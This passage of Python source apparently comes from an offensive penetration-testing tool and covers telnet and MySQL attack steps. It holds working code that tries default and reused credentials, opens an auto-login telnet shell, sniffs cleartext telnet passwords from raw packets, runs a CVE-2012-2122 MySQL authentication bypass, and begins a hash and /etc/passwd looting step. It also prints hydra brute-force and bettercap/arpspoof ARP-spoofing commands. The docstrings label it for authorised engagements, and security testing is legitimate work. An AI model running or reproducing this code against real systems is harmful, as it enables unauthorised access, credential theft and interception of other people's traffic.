        asks_pass = bool(_TELNET_PROMPT_PASS.search(tail)) or low.endswith("password:")
        if not (asks_login or asks_pass):                    # maybe a direct shell — verify
            mark = f"PSH{os.urandom(2).hex()}"
            try:
                s.sendall(f"id; echo {mark}$((6*7))\n".encode())
                resp = _telnet_pump(s, budget=3.0)
            except OSError:
                resp = ""
            if f"{mark}42" in resp or re.search(r"uid=\d+\(", resp):
                muid = re.search(r"(uid=\d+\([^\r\n]+)", resp)
                noauth_ctx = muid.group(1).strip() if muid else "shell executes commands"
            elif _TELNET_PROMPT_LOGIN.search(resp) or "password:" in resp.lower():
                asks_login = True                            # auth prompt arrived after our input
    finally:
        try:
            s.close()
        except Exception:                                    # noqa: BLE001
            pass

    product, version = _telnet_fingerprint(banner)
    if product:
        save_services(ip, [{"port": port, "proto": proto, "name": "telnet",
                            "product": product, "version": version}])

    shown = " | ".join(ln.strip() for ln in banner.splitlines() if ln.strip())[:200]
    lines = [f"[*] Banner: {shown or '(none — silent / binary)'}"]
    if product:
        lines.append(f"[*] Service: telnet {product}{(' ' + version) if version else ''}")
    if noauth_ctx:
        lines.append(f"✗ NOAUTH unauthenticated shell — {noauth_ctx}")
        lines.append("· spawn it: Privilege Escalation phase → spawn-shell (r1)")
    elif asks_login or asks_pass:
        lines.append("· login prompt — needs creds (run telnet-creds)")
    else:
        lines.append("· no login prompt and no shell confirmed — inspect the banner / try creds")

    ss = shutil.which("searchsploit")
    if ss and product and version:
        proc = subprocess.run([ss, "-j", "-s", "-t", product, version],
                              capture_output=True, text=True, timeout=30)
        try:
            rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
        except ValueError:
            rows = []
        seen = set()
        for r in rows[:20]:
            edb = str(r.get("EDB-ID", "?"))
            if edb in seen:
                continue
            seen.add(edb)
            lines.append(f"[searchsploit] {(r.get('Title') or '').strip()}  (EDB-{edb})")
            if len(seen) >= 8:
                break
    elif not ss and product:
        lines.append("· searchsploit not installed — check Exploit-DB for the version manually")
    return f"Telnet banner — {ip}:{port}\n\n" + "\n".join(lines)


# ── Telnet step 2: known / default / reused credentials (targeted, lockout-safe) ──
_TELNETCREDS_DEADLINE = 120       # s — wall-clock cap
_TELNETCREDS_MAX = 60             # ceiling on login attempts (targeted, not a brute)
_TELNET_DEFAULTS = [              # curated telnet / device defaults — not a wordlist
    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "admin"), ("root", "password"),
    ("root", "calvin"), ("root", "default"), ("root", "1234"), ("admin", "admin"), ("admin", ""),
    ("admin", "password"), ("admin", "1234"), ("admin", "admin123"), ("administrator", "administrator"),
    ("user", "user"), ("guest", "guest"), ("guest", ""), ("cisco", "cisco"), ("support", "support"),
    ("ubnt", "ubnt"), ("pi", "raspberry"),
]


def _telnet_login_test(ip: str, port: int, user: str, pw: str) -> "bool | None":
    """One telnet login on a fresh raw socket. True=valid (probe-verified), False=rejected,
    None=connection error or an unauthenticated shell (no login to test)."""
    import socket
    import os
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((ip, port))
    except OSError:
        return None
    try:
        intro = _telnet_pump(s, budget=3.5)
        tail = intro.rstrip()[-80:]
        low = tail.lower()
        asks_login = bool(_TELNET_PROMPT_LOGIN.search(tail)) or "login:" in low
        asks_pass = bool(_TELNET_PROMPT_PASS.search(tail)) or low.endswith("password:")
        if not asks_login and not asks_pass and re.search(r"[#$>]\s*$", tail):
            return None                                      # no-auth shell — nothing to authenticate
        if asks_login or not asks_pass:
            s.sendall((user + "\r\n").encode())
            p2 = _telnet_pump(s, budget=3.0)
        else:
            p2 = intro
        if asks_pass or "password" in p2.lower() or _TELNET_PROMPT_PASS.search(p2):
            s.sendall((pw + "\r\n").encode())
        after = _telnet_pump(s, budget=3.0)
        if re.search(r"(?i)incorrect|denied|failed|invalid|bad", p2 + after):
            return False
        mark = f"PSH{os.urandom(2).hex()}"                   # verify we actually landed in a shell
        try:
            s.sendall(f"id; echo {mark}$((6*7))\n".encode())
            resp = _telnet_pump(s, budget=2.5)
        except OSError:
            resp = ""
        if f"{mark}42" in resp or re.search(r"uid=\d+\(", resp):
            return True
        if re.search(r"[#$>]\s*$", after.rstrip()) and not (
                _TELNET_PROMPT_LOGIN.search(after) or "login:" in after.lower()):
            return True                                      # shell prompt, no re-login → likely in
        return False
    except OSError:
        return None
    finally:
        try:
            s.close()
        except Exception:                                    # noqa: BLE001
            pass


def _gather_telnet_creds(ip: str) -> list:
    """(user, pass) telnet logins telnet-creds proved for this host ('telnet on <ip>')."""
    out = []
    for sid, output in fetch_scripts(ip, 445, "tcp"):
        if sid != "smb-creds":
            continue
        for m in re.finditer(rf"! (\S+?):(\S*) @ telnet on {re.escape(ip)}\b", output or ""):
            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
    return out


def _tool_telnet_creds(ip: str, port: int, proto: str) -> str:
    """Telnet step 2 tool: try a curated set of default/device telnet credentials plus any harvested
    password (reuse across services) — targeted, NOT a wordlist brute, so it stays lockout-safe.
    Each login is probe-verified (we confirm a real shell). Valid logins are saved to smb-creds
    ('telnet on <host>') for reuse and spawn-shell. An unreachable host raises. Authorised only."""
    import time
    banner = next((o for s, o in fetch_scripts(ip, port, proto) if s == "telnet-banner"), "")
    if "✗ NOAUTH" in banner:
        return ("Telnet credentials — {0}:{1}\n\n"
                "· unauthenticated shell already (telnet-banner) — no creds needed; "
                "Privilege Escalation phase → spawn-shell (r1)").format(ip, port)

    reused = [(u, s) for _d, u, s in _gather_all_smb_creds()
              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]          # password reuse (no hashes)
    candidates, seen = [], set()
    for u, p in _TELNET_DEFAULTS + reused:
        key = (u.lower(), p)
        if key not in seen:
            seen.add(key)
            candidates.append((u, p, (u, p) not in _TELNET_DEFAULTS))    # (user, pass, is_reused)
    candidates = candidates[:_TELNETCREDS_MAX]

    deadline = time.time() + _TELNETCREDS_DEADLINE
    valid, conn_err = [], 0
    for user, pw, is_reused in candidates:
        if time.time() > deadline:
            break
        r = _telnet_login_test(ip, port, user, pw)
        if r is True:
            valid.append((user, pw, is_reused))
            break                                            # one working login is enough for a foothold
        elif r is None:
            conn_err += 1
            if conn_err >= 5:
                break
    if conn_err >= 5 and not valid:
        raise RuntimeError(f"{ip}:{port} — telnet not answering login attempts (down / not telnet?)")

    if valid:                                                # persist to the canonical creds store
        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
        for user, pw, _r in valid:
            line = f"! {user}:{pw or '<blank>'} @ telnet on {ip} [{ip}]"
            blocks.setdefault(ip, [])
            if line not in blocks[ip]:
                blocks[ip].append(line)
        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)

    lines = [f"[*] {len(candidates)} cred(s) tried (defaults + reuse) · {len(valid)} valid"]
    for user, pw, is_reused in valid:
        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}" + ("  (reused)" if is_reused else ""))
    if valid:
        lines.append("· spawn it: Privilege Escalation phase → spawn-shell (r1)")
    else:
        lines.append("· no default/reused login worked")
        lines.append(f"· full brute (only if no lockout): hydra -l <user> -P "
                     f"/usr/share/wordlists/rockyou.txt telnet://{ip}")
    return f"Telnet credentials — {ip}:{port}\n\n" + "\n".join(lines)


# ── Telnet foothold: auto-login interactive session (spawned via spawn-shell) ──
_TELNET_SHELL_SRC = r'''
import socket, sys, os, select, time
IP = __IP__
PORT = __PORT__
USER = __USER__
PW = __PW__
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
st = [0]; opt = [None]
def feed(data):
    out = bytearray(); rep = bytearray()
    for b in data:
        if st[0] == 0:
            if b == 255: st[0] = 1
            else: out.append(b)
        elif st[0] == 1:
            if b in (251, 252, 253, 254): opt[0] = b; st[0] = 2
            elif b == 250: st[0] = 3
            elif b == 255: out.append(255); st[0] = 0
            else: st[0] = 0
        elif st[0] == 2:
            if opt[0] == 253: rep += bytes((255, 252, b))
            elif opt[0] == 251: rep += bytes((255, 254, b))
            st[0] = 0
        elif st[0] == 3:
            st[0] = 4 if b == 255 else 3
        elif st[0] == 4:
            st[0] = 0 if b == 240 else 3
    if rep:
        try: s.sendall(bytes(rep))
        except OSError: pass
    return bytes(out)
if USER:
    buf = b""; su = sp = False; end = time.time() + 15
    while time.time() < end and not sp:
        r, _, _ = select.select([s], [], [], 0.5)
        if s in r:
            try: d = s.recv(4096)
            except OSError: break
            if not d: break
            c = feed(d); buf += c
            os.write(1, c)
            low = buf.lower()
            if not su and (b"login:" in low or b"username:" in low):
                s.sendall((USER + "\r\n").encode()); su = True; buf = b""
            elif su and not sp and b"password" in low:
                s.sendall((PW + "\r\n").encode()); sp = True; buf = b""
try:
    import termios, tty
    old = termios.tcgetattr(0); tty.setraw(0)
except Exception:
    old = None
try:
    while True:
        r, _, _ = select.select([0, s], [], [])
        if 0 in r:
            d = os.read(0, 1024)
            if not d: break
            s.sendall(d)
        if s in r:
            d = s.recv(4096)
            if not d: break
            os.write(1, feed(d))
finally:
    if old is not None:
        try: termios.tcsetattr(0, termios.TCSADRAIN, old)
        except Exception: pass
    s.close()
sys.stdout.write("\n[*] telnet session closed - press enter to close this tab\n")
try: input()
except Exception: pass
'''


def _tool_telnet_shell(ip: str, port: int, proto: str) -> str:
    """Telnet foothold (INTERACTIVE): spawn an auto-logging-in telnet session in a new terminal —
    using a telnet-creds cred, or straight in when telnet-banner found an unauthenticated shell.
    Headless: prints the plain `telnet` command. Authorised targets only."""
    import tempfile
    banner = next((o for s, o in fetch_scripts(ip, port, proto) if s == "telnet-banner"), "")
    noauth = "✗ NOAUTH" in banner
    creds = _gather_telnet_creds(ip)
    if creds:
        if len(creds) == 1:
            user, pw = creds[0]
        else:
            print(f"\n{BOLD}telnet creds{RESET}")
            for i, (u, _p) in enumerate(creds, 1):
                print(f"  {BOLD}{i}{RESET}  {u}")
            v = _ask("pick cred [1-N, blank = 1]:")
            user, pw = creds[int(v) - 1] if (v and v.isdigit() and 1 <= int(v) <= len(creds)) else creds[0]
        who = user
    elif noauth:
        user, pw, who = "", "", "no-auth"
    else:
        print(f"\n{YELLOW}no telnet foothold yet{RESET} — run {BOLD}telnet-banner (r1){RESET} "
              f"(no-auth shell) or {BOLD}telnet-creds (r2){RESET} (a valid login) first.")
        return "telnet-shell: no telnet foothold (run telnet-banner r1 / telnet-creds r2)"

    src = (_TELNET_SHELL_SRC.replace("__IP__", repr(ip)).replace("__PORT__", str(port))
           .replace("__USER__", repr(user)).replace("__PW__", repr(pw)))
    fd, spath = tempfile.mkstemp(prefix="pshunter_telnet_", suffix=".py")
    with os.fdopen(fd, "w") as fh:
        fh.write(src)
    used = _open_listener_terminal(spath)
    if not used:
        _safe_unlink(spath)
        creds_note = f" (log in as {who})" if who != "no-auth" else " (drops straight to a shell)"
        print(f"{YELLOW}headless{RESET} — run: {BOLD}telnet {ip} {port}{RESET}{DIM}{creds_note}{RESET}")
        return f"telnet-shell: headless — telnet {ip} {port} shown"
    print(f"{GREEN}▶ telnet session opened in a new {used} window{RESET} {DIM}→ {who}@{ip}:{port}{RESET}")
    return f"telnet-shell: shell → {who}@{ip}:{port}"


# ── Telnet step 3: sniff cleartext creds off the wire (passive; MITM stays manual) ──
_TELNETSNIFF_DEADLINE = 300       # s — capture window before it self-stops
_TELNETSNIFF_MAXBUF = 65536       # cap per-direction reassembly


def _telnet_strip_iac(data: bytes) -> bytes:
    """Remove IAC commands / subnegotiation from a raw telnet byte stream (buffer version)."""
    out = bytearray()
    st = 0
    for b in data:
        if st == 0:
            out.append(b) if b != 255 else None
            st = 1 if b == 255 else 0
        elif st == 1:
            if b in (251, 252, 253, 254):
                st = 2
            elif b == 250:
                st = 3
            elif b == 255:
                out.append(255); st = 0
            else:
                st = 0
        elif st == 2:
            st = 0
        elif st == 3:
            st = 4 if b == 255 else 3
        elif st == 4:
            st = 0 if b == 240 else 3
    return bytes(out)


def _telnet_sniff_parse(to_server: bytes, from_server: bytes) -> "tuple | None":
    """Recover (user, pass) from a captured telnet exchange: the server side must show a
    login + password prompt, and the client side carries what was typed (IAC-stripped, split
    on CR/LF). Returns (user, pass) or None."""
    stext = _telnet_strip_iac(from_server).decode("latin-1", "replace").lower()
    if ("login:" not in stext and "username:" not in stext) or "password:" not in stext:
        return None
    typed = _telnet_strip_iac(to_server).decode("latin-1", "replace")
    typed = "".join(ch for ch in typed if ch in "\r\n" or 32 <= ord(ch) < 127)
    parts = [p for p in re.split(r"[\r\n\x00]+", typed) if p != ""]
    if len(parts) >= 2:
        return (parts[0][:64], parts[1][:64])
    return None


def _tool_telnet_sniff(ip: str, port: int, proto: str) -> str:
    """Telnet step 3 tool: PASSIVELY sniff cleartext telnet (TCP/23) on the interface toward the
    target for a bounded window and recover any login/password that crosses the wire (raw AF_PACKET
    socket, pure stdlib, Linux). It does NOT ARP-spoof — on a switched segment run the printed MITM
    setup yourself first. Captured creds are saved to the store ('telnet on <host>'). Needs root.
    This observes third-party traffic — authorised internal engagements ONLY."""
    import socket
    import time
    if not _is_root():
        raise RuntimeError("sniffing needs root (raw socket) — re-launch under sudo")
    iface = _iface_toward(ip)
    if not iface:
        raise RuntimeError(f"could not determine the local interface toward {ip}")
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        s.bind((iface, 0))
        s.settimeout(2.0)
    except (AttributeError, OSError) as exc:
        raise RuntimeError(f"raw capture unavailable ({exc}) — Linux + root required")

    tip = socket.inet_aton(ip)
    to_server, from_server = bytearray(), bytearray()
    found, end = [], time.time() + _TELNETSNIFF_DEADLINE
    try:
        while time.time() < end and not found:
            try:
                frame = s.recv(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            if len(frame) < 34 or frame[12:14] != b"\x08\x00" or frame[23] != 6:
                continue                                     # not IPv4/TCP
            ihl = (frame[14] & 0x0f) * 4
            tcp = 14 + ihl
            if len(frame) < tcp + 20:
                continue
            src, dst = frame[26:30], frame[30:34]
            sport = int.from_bytes(frame[tcp:tcp + 2], "big")
            dport = int.from_bytes(frame[tcp + 2:tcp + 4], "big")
            payload = frame[tcp + ((frame[tcp + 12] >> 4) * 4):]
            if src == tip and sport == port:
                from_server += payload
            elif dst == tip and dport == port:
                to_server += payload
            else:
                continue
            del to_server[:-_TELNETSNIFF_MAXBUF]             # cap memory
            del from_server[:-_TELNETSNIFF_MAXBUF]
            got = _telnet_sniff_parse(bytes(to_server), bytes(from_server))
            if got:
                found.append(got)
    finally:
        s.close()

    if found:                                                # persist to the canonical creds store
        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
        for user, pw in found:
            line = f"! {user}:{pw or '<blank>'} @ telnet on {ip} [{ip}]"
            blocks.setdefault(ip, [])
            if line not in blocks[ip]:
                blocks[ip].append(line)
        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)

    lhost_iface = iface
    lines = [f"[*] passive telnet capture on {lhost_iface} · up to {_TELNETSNIFF_DEADLINE // 60} min"]
    for user, pw in found:
        lines.append(f"✗ SNIFF {user}:{pw or '<blank>'}")
    if not found:
        lines.append("· no cleartext telnet login crossed this NIC in the window")
        lines.append(f"· switched segment? position first, then re-run: "
                     f"{BOLD}bettercap -iface {iface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; net.sniff on'{RESET}")
        lines.append(f"· or: arpspoof -i {iface} -t {ip} <gateway>  (+ enable ip_forward)")
    else:
        lines.append("· spawn it: Privilege Escalation phase → spawn-shell (r1)")
    return f"Telnet sniff — {ip}:{port}\n\n" + "\n".join(lines)


# ── Telnet step 4: manual steps & further research (reference only, context-aware) ─
def _tool_telnet_next(ip: str, port: int, proto: str) -> str:
    """Telnet step-4 tool: NOT a scan — a read-only checklist of where to go on telnet, with this
    host's own findings substituted in (a no-auth shell or proven creds to spawn, creds to reuse,
    device/vendor angles, phase CVEs, MITM sniffing, and unconfirmed ⚠ hits). Pure DB synthesis."""
    scripts = fetch_scripts(ip, port, proto)
    by_sid = {}
    for sid, out in scripts:
        by_sid.setdefault(sid, out or "")
    banner, sniff = by_sid.get("telnet-banner", ""), by_sid.get("telnet-sniff", "")

    noauth = "✗ NOAUTH" in banner
    mv = re.search(r"^\[\*\] Service:\s*(.+)$", banner, re.M)
    ver = mv.group(1).strip() if mv else ""
    creds = _gather_telnet_creds(ip)
    sniffed = re.findall(r"^✗ SNIFF (.+)$", sniff, re.M)

    oports = {(p, pr) for p, pr, _s in fetch_ports(ip)}
    reuse_svc = [n for (pnum, n) in ((22, "SSH"), (21, "FTP"), (445, "SMB"), (3389, "RDP"), (5985, "WinRM"))
                 if (pnum, "tcp") in oports]

    kev = _load_kev()
    found = set()
    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
        if p == port and pr == proto and cv:
            found |= {c.strip() for c in cv.split(",") if c.strip()}
    for _sid, out in scripts:
        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
    found = sorted(found, key=_cve_sort_key)

    warns = []
    for sid, out in scripts:
        for ln in (out or "").splitlines():
            if ln.strip().startswith("⚠"):
                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
    warns = warns[:14]

    sub = f"{DIM}version: {ver or 'unknown'}  ·  no-auth shell: {'yes' if noauth else 'no'}  ·  creds: {len(creds)}"
    L = [f"Telnet {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]

    L.append(f"\n{BOLD}A. Land a shell{RESET}")
    if noauth or creds:
        why = "unauthenticated shell" if noauth else f"{len(creds)} proven cred(s)"
        L.append(f"  {CYAN}ready{RESET} {DIM}({why}) → Privilege Escalation phase → spawn-shell (r1){RESET}")
    else:
        L.append(f"  {DIM}no foothold yet — try telnet-creds (r2), sniff (r3), or vendor defaults / "
                 f"backdoor prompts below{RESET}")

    L.append(f"\n{BOLD}B. Reuse these creds elsewhere{RESET}")
    allc = list(dict.fromkeys([f"{u}:{p or '<blank>'}" for u, p in creds]
                              + [s.strip() for s in sniffed]))
    if allc:
        L.append(f"  {CYAN}{', '.join(allc[:8])}{RESET}")
        tgt = ", ".join(reuse_svc) if reuse_svc else "SSH / FTP / SMB / web / enable"
        L.append(f"  {DIM}→ spray on {tgt}; try as enable/root; password reuse across the estate{RESET}")
    else:
        L.append(f"  {DIM}none yet — run telnet-creds (r2){RESET}")

    L.append(f"\n{BOLD}C. Device / vendor angles (telnet ≈ routers, IoT, embedded){RESET}")
    L.append(f"  {DIM}vendor default creds (admin/admin, root/calvin, ubnt/ubnt, Cisco enable) · "
             f"backdoor prompts (some D-Link/Netis) · debug/AT consoles{RESET}")
    L.append(f"  {DIM}exact banner → searchsploit '{ver or '<device>'}'; grab running-config / NVRAM once in{RESET}")

    L.append(f"\n{BOLD}D. CVEs surfaced in this phase{RESET}")
    if found:
        for c in found:
            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
    else:
        L.append(f"  {DIM}none surfaced — searchsploit the banner / firmware version{RESET}")

    L.append(f"\n{BOLD}E. Cleartext sniffing / MITM{RESET}")
    if sniffed:
        L.append(f"  {CYAN}captured:{RESET} {', '.join(s.strip() for s in sniffed[:6])}")
    else:
        L.append(f"  {DIM}on-segment? passive sniff (r3); switched → bettercap/arpspoof MITM first, then r3{RESET}")

    L.append(f"\n{BOLD}F. Post-shell{RESET}")
    L.append(f"  {DIM}enumerate + loot configs/creds; BusyBox/restricted shell → escape; "
             f"reuse creds & pivot; kernel/firmware privesc{RESET}")

    L.append(f"\n{BOLD}G. Verify unconfirmed findings from this phase{RESET}")
    if warns:
        for w in warns:
            L.append(f"  {w}")
    else:
        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")

    L.append(f"\n{BOLD}H. Re-run & housekeeping{RESET}")
    L.append(f"  {DIM}after proving a cred, reuse it on SSH/SMB (r2 stores it); telnet is cleartext — "
             f"note the exposure in the report{RESET}")
    return "\n".join(L)


# ══ MySQL / MariaDB (3306) ══ the initial handshake leaks the server version in cleartext (no
# auth), so the banner is pure stdlib; auth/queries later go through netexec (binary protocol).
def _recv_exact(sock, n: int) -> bytes:
    """Read exactly n bytes from a socket (or fewer on EOF/timeout)."""
    buf = bytearray()
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
    return bytes(buf)


def _mysql_handshake(ip: str, port: int, timeout: float = 8.0) -> dict:
    """Read + parse the MySQL/MariaDB initial handshake (unauthenticated). Returns
    {version, protocol, auth_plugin} or {error}. Raises on a connection failure."""
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        try:
            s.connect((ip, port))
        except OSError as exc:
            raise RuntimeError(f"no MySQL on {ip}:{port} ({exc})")
        hdr = _recv_exact(s, 4)
        if len(hdr) < 4:
            raise RuntimeError("no handshake (not MySQL / TLS-only?)")
        length = hdr[0] | (hdr[1] << 8) | (hdr[2] << 16)
        payload = _recv_exact(s, length)
    finally:
        try:
            s.close()
        except Exception:                                    # noqa: BLE001
            pass
    if not payload:
        raise RuntimeError("empty handshake payload")
    if payload[0] == 0xff:                                   # ERROR packet (e.g. host blocked)
        code = payload[1] | (payload[2] << 8)
        return {"error": f"{code} {payload[3:].decode('latin-1', 'replace').strip()}"}
    try:
        end = payload.index(0x00, 1)
        version = payload[1:end].decode("latin-1", "replace")
    except ValueError:
        raise RuntimeError("malformed handshake (no version string)")
    mplug = re.search(rb"([a-z0-9_]+_password)\x00?$", payload)
    return {"version": version, "protocol": payload[0],
            "auth_plugin": mplug.group(1).decode() if mplug else None}


def _tool_mysql_banner(ip: str, port: int, proto: str) -> str:
    """MySQL step 1 tool: read the unauthenticated initial handshake (stdlib) → server product,
    exact version and default auth plugin (mysql_native_password vs caching_sha2_password), record
    it as the service, query Exploit-DB (searchsploit) and flag old 5.x builds worth an auth-bypass
    test. Read-only, no login. A host that doesn't speak MySQL raises. Authorised targets only."""
    hs = _mysql_handshake(ip, port)
    if "error" in hs:
        return (f"MySQL banner — {ip}:{port}\n\n· server refused the handshake: {hs['error']}\n"
                "· often 'Host is blocked' (too many bad auths) → mysqladmin flush-hosts, or come back later")
    version = hs["version"]
    low = version.lower()
    if "mariadb" in low:
        product = "MariaDB"
        mnum = (re.search(r"(?:5\.5\.5-)?(\d+\.\d+\.\d+[\w.]*?)-?mariadb", version, re.I)
                or re.search(r"(\d+\.\d+\.\d+)", version))
    else:
        product = "MySQL"
        mnum = re.search(r"(\d+\.\d+\.\d+)", version)
    vnum = mnum.group(1) if mnum else version
    save_services(ip, [{"port": port, "proto": proto, "name": "mysql",
                        "product": product, "version": vnum}])

    lines = [f"[*] Handshake: {version}",
             f"[*] Service: {product} {vnum}"
             + (f"  ·  auth: {hs['auth_plugin']}" if hs["auth_plugin"] else "")]
    if hs["auth_plugin"] == "caching_sha2_password":
        lines.append("· caching_sha2_password (MySQL 8 default) — creds need netexec / a full client")
    if re.match(r"5\.(1|5|6)\.", vnum):
        lines.append("· old 5.x — worth an auth-bypass (repeated-login) test in mysql-creds")

    ss = shutil.which("searchsploit")
    if ss:
        proc = subprocess.run([ss, "-j", "-s", "-t", product, vnum],
                              capture_output=True, text=True, timeout=30)
        try:
            rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
        except ValueError:
            rows = []
        seen = set()
        for r in rows[:20]:
            edb = str(r.get("EDB-ID", "?"))
            if edb in seen:
                continue
            seen.add(edb)
            lines.append(f"[searchsploit] {(r.get('Title') or '').strip()}  (EDB-{edb})")
            if len(seen) >= 8:
                break
    else:
        lines.append("· searchsploit not installed — check Exploit-DB for the version manually")
    return f"MySQL banner — {ip}:{port}\n\n" + "\n".join(lines)


# ── MySQL step 2: root no-pass + default / reused creds; CVE-2012-2122 bypass on old 5.x ──
_MYSQLCREDS_DEADLINE = 120
_MYSQLCREDS_MAX = 60
_MYSQL_BYPASS_TRIES = 256        # CVE-2012-2122: ~1/256 wrong-password auths slip through
_MYSQL_DEFAULTS = [
    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "mysql"), ("root", "password"),
    ("root", "admin"), ("root", "123456"), ("root", "P@ssw0rd"), ("admin", "admin"),
    ("mysql", "mysql"), ("user", "user"), ("test", "test"), ("dbuser", "dbuser"), ("web", "web"),
]


def _mysql_query(ip: str, port: int, user: str, pw: str, sql: str, timeout: int = 15) -> tuple:
    """Run a SQL query via the mysql/mariadb CLI. Returns (rc, output) or (None, '') if no client.
    rc 0 = success; access-denied / errors set rc != 0."""
    exe = shutil.which("mysql") or shutil.which("mariadb")
    if not exe:
        return (None, "")
    try:
        p = subprocess.run([exe, "-h", ip, "-P", str(port), "-u", user, f"--password={pw}",
                            "--connect-timeout=6", "--protocol=TCP", "-N", "-B", "-e", sql],
                           capture_output=True, text=True, timeout=timeout)
        return (p.returncode, (p.stdout or "") + (p.stderr or ""))
    except (OSError, subprocess.SubprocessError):
        return (None, "")


def _mysql_auth_nxc(ip: str, port: int, user: str, pw: str) -> "bool | None":
    """Auth check via netexec mysql (fallback when no CLI). True/False, or None if netexec absent."""
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        return None
    try:
        p = subprocess.run([nxc, "mysql", ip, "--port", str(port), "-u", user, "-p", pw],
                           capture_output=True, text=True, timeout=40)
        out = re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or ""))
    except (OSError, subprocess.SubprocessError):
        return None
    return bool(re.search(r"\bMYSQL\b.*\[\+\]", out))


def _mysql_auth(ip: str, port: int, user: str, pw: str) -> bool:
    """True when (user, pw) authenticates — mysql CLI first, netexec fallback."""
    rc, out = _mysql_query(ip, port, user, pw, "SELECT 1")
    if rc is not None:
        return rc == 0 and "access denied" not in out.lower()
    return bool(_mysql_auth_nxc(ip, port, user, pw))


def _gather_mysql_creds(ip: str) -> list:
    """(user, pass) MySQL logins mysql-creds proved for this host ('mysql on <ip>')."""
    out = []
    for sid, output in fetch_scripts(ip, 445, "tcp"):
        if sid != "smb-creds":
            continue
        for m in re.finditer(rf"! (\S+?):(\S*) @ mysql on {re.escape(ip)}\b", output or ""):
            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
    return out


def _tool_mysql_creds(ip: str, port: int, proto: str) -> str:
    """MySQL step 2 tool: try root with no password plus a curated set of default MySQL creds and
    any harvested password (reuse across services) via the mysql/mariadb CLI (netexec fallback) —
    targeted, NOT a wordlist brute. When mysql-banner flagged an old 5.x build, also run the
    CVE-2012-2122 auth-bypass (repeated wrong-password logins; ~1/256 slip through). Valid logins
    are saved to the store ('mysql on <host>'). No client/netexec → raises. Authorised only."""
    import time
    if not (shutil.which("mysql") or shutil.which("mariadb")
            or shutil.which("netexec") or shutil.which("nxc")):
        raise RuntimeError("need a mysql/mariadb client or netexec to test MySQL creds")

    reused = [(u, s) for _d, u, s in _gather_all_smb_creds()
              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
    candidates, seen = [], set()
    for u, p in _MYSQL_DEFAULTS + reused:
        key = (u.lower(), p)
        if key not in seen:
            seen.add(key)
            candidates.append((u, p, (u, p) not in _MYSQL_DEFAULTS))
    candidates = candidates[:_MYSQLCREDS_MAX]

    deadline = time.time() + _MYSQLCREDS_DEADLINE
    valid = []
    for user, pw, is_reused in candidates:
        if time.time() > deadline:
            break
        if _mysql_auth(ip, port, user, pw):
            valid.append((user, pw, is_reused))
            break                                            # one working login is enough

    bypass = False
    banner = next((o for s, o in fetch_scripts(ip, port, proto) if s == "mysql-banner"), "")
    if not valid and "auth-bypass" in banner and (shutil.which("mysql") or shutil.which("mariadb")):
        for _ in range(_MYSQL_BYPASS_TRIES):
            if time.time() > deadline:
                break
            rc, out = _mysql_query(ip, port, "root", "wrongpw_pshunter", "SELECT 1", timeout=8)
            if rc == 0:
                bypass = True
                valid.append(("root", "", False))
                break
            if rc is None or "is blocked" in out.lower():    # max_connect_errors tripped → stop
                break

    if valid:                                                # persist to the canonical creds store
        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
        for user, pw, _r in valid:
            line = f"! {user}:{pw or '<blank>'} @ mysql on {ip} [{ip}]"
            blocks.setdefault(ip, [])
            if line not in blocks[ip]:
                blocks[ip].append(line)
        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)

    lines = [f"[*] {len(candidates)} cred(s) tried (defaults + reuse)"
             + (f" + {_MYSQL_BYPASS_TRIES}-try auth-bypass" if "auth-bypass" in banner else "")
             + f" · {len(valid)} valid"]
    if bypass:
        lines.append("✗ BYPASS root (CVE-2012-2122 auth bypass — no password needed)")
    for user, pw, is_reused in valid:
        if bypass and user == "root":
            continue
        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}" + ("  (reused)" if is_reused else ""))
    if valid:
        lines.append("· loot it (r3) → dump users/hashes, LOAD_FILE, then RCE (r4)")
    else:
        lines.append("· no default/reused login worked"
                     + ("" if "auth-bypass" in banner else " — old 5.x? re-run mysql-banner (r1)"))
    return f"MySQL credentials — {ip}:{port}\n\n" + "\n".join(lines)


# ── MySQL step 3: loot — enumerate DBs/users, dump hashes & app creds, LOAD_FILE ──
_MYSQLLOOT_DEADLINE = 120
_MYSQL_SYSDB = ("information_schema", "performance_schema", "sys", "mysql")


def _tool_mysql_loot(ip: str, port: int, proto: str) -> str:
    """MySQL step 3 tool: with a proven cred, enumerate databases, dump the mysql.user password
    hashes (→ crack), harvest cleartext app credentials from tables with password-like columns, and
    LOAD_FILE /etc/passwd when the FILE privilege allows it. Read-only queries via the mysql CLI. No
    stored cred / no client → raises. Authorised targets only."""
    import time
